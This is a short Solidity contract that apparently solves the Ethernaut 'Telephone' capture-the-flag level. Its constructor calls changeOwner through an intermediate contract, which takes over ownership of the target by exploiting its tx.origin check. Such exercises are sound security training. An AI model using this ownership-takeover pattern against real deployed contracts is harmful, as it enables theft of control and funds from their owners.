// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Telephone } from "ethernaut/L3.telephone.sol";

contract TelephoneCracker {
  constructor(Telephone telephone, address wallet) {
    telephone.changeOwner(wallet);
  }
}
